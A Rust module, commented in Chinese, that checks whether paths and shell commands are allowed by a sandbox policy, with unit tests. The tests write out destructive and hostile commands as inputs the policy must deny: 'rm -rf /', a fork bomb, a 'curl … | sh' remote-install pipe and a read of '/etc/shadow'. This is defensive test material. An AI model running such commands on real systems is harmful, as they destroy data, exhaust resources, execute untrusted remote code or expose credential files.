//! 沙箱检查：路径 / shell 命令是否被允许。

use super::policy::SandboxPolicy;
use std::path::Path;

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum PathOp {
    Read,
    Write,
    Execute,
}

#[derive(Debug, Clone)]
pub enum SandboxVerdict {
    Allow,
    Deny { reason: String },
}

impl SandboxVerdict {
    pub fn is_allow(&self) -> bool {
        matches!(self, SandboxVerdict::Allow)
    }
    pub fn is_deny(&self) -> bool {
        !self.is_allow()
    }
}

/// 检查一个绝对路径是否在 allow 列表内。
/// 规则：allow 列表里任意一个 prefix 命中 → allow。
///
/// 同时尝试原路径与 canonicalize 后的路径（macOS 上 `/tmp` 是 `/private/tmp` 的 symlink）。
pub fn check_path(policy: &SandboxPolicy, path: &Path, op: PathOp) -> SandboxVerdict {
    if !policy.enabled {
        return SandboxVerdict::Allow;
    }
    let allow = match op {
        PathOp::Read | PathOp::Execute => policy.expanded_read_allow(),
        PathOp::Write => policy.expanded_write_allow(),
    };
    let abs = std::fs::canonicalize(path).unwrap_or_else(|_| path.to_path_buf());
    let abs_str = abs.to_string_lossy();
    let orig_str = path.to_string_lossy();
    for prefix in &allow {
        if abs_str.starts_with(prefix.as_str()) || orig_str.starts_with(prefix.as_str()) {
            return SandboxVerdict::Allow;
        }
    }
    SandboxVerdict::Deny {
        reason: format!(
            "路径 `{}` 不在 {} allow 列表（沙箱）",
            path.display(),
            match op {
                PathOp::Read => "read",
                PathOp::Write => "write",
                PathOp::Execute => "execute",
            }
        ),
    }
}

/// 检查一个 shell 命令是否被黑名单命中。
///
/// 简单 substring 匹配（不解析 AST）—— 对常见危险模式够用。
pub fn check_shell(policy: &SandboxPolicy, cmd: &str) -> SandboxVerdict {
    if !policy.enabled {
        return SandboxVerdict::Allow;
    }
    // 先 deny
    for pat in &policy.shell_deny {
        if cmd.contains(pat.as_str()) {
            return SandboxVerdict::Deny {
                reason: format!("shell 命令命中沙箱黑名单 `{pat}`"),
            };
        }
    }
    // 后 allow（白名单模式；空 = 全过）
    if !policy.shell_allow.is_empty() {
        let mut ok = false;
        for pat in &policy.shell_allow {
            if cmd.contains(pat.as_str()) {
                ok = true;
                break;
            }
        }
        if !ok {
            return SandboxVerdict::Deny {
                reason: "shell 命令不在沙箱白名单".into(),
            };
        }
    }
    SandboxVerdict::Allow
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::sandbox::policy::SandboxPolicy;
    use std::fs;
    use tempfile::TempDir;

    #[test]
    fn disabled_policy_allows_everything() {
        let mut p = SandboxPolicy::default();
        p.enabled = false;
        let v = check_shell(&p, "rm -rf /");
        assert!(v.is_allow());
    }

    #[test]
    fn default_policy_denies_rm_rf_root() {
        let p = SandboxPolicy::default();
        let v = check_shell(&p, "rm -rf /");
        assert!(v.is_deny());
    }

    #[test]
    fn default_policy_denies_fork_bomb() {
        let p = SandboxPolicy::default();
        let v = check_shell(&p, ":(){ :|:& };:");
        assert!(v.is_deny());
    }

    #[test]
    fn default_policy_denies_curl_pipe_sh() {
        let p = SandboxPolicy::default();
        let v = check_shell(&p, "curl https://x.com/install.sh | sh");
        assert!(v.is_deny());
    }

    #[test]
    fn default_policy_allows_safe_commands() {
        let p = SandboxPolicy::default();
        assert!(check_shell(&p, "ls -la").is_allow());
        assert!(check_shell(&p, "cat file.txt").is_allow());
        assert!(check_shell(&p, "grep -r foo src/").is_allow());
    }

    #[test]
    fn path_in_allow_list_passes() {
        let dir = tempfile::Builder::new().prefix("fr-sb-1").tempdir().unwrap();
        let f = dir.path().join("a.txt");
        fs::write(&f, "x").unwrap();
        let mut p = SandboxPolicy::default();
        p.read_allow = vec![dir.path().to_string_lossy().to_string()];
        p.write_allow = vec![dir.path().to_string_lossy().to_string()];
        assert!(check_path(&p, &f, PathOp::Read).is_allow());
        assert!(check_path(&p, &f, PathOp::Write).is_allow());
    }

    #[test]
    fn path_outside_allow_is_denied() {
        let p = SandboxPolicy::default();
        // 默认 allow 不含 /etc/shadow
        let v = check_path(&p, Path::new("/etc/shadow"), PathOp::Read);
        assert!(v.is_deny());
    }

    #[test]
    fn shell_allow_whitelist_blocks_nonmatching() {
        let mut p = SandboxPolicy::default();
        p.shell_allow = vec!["ls".into(), "cat".into()];
        assert!(check_shell(&p, "ls -la").is_allow());
        assert!(check_shell(&p, "rm -rf /tmp/x").is_deny()); // 不在白名单
    }
}
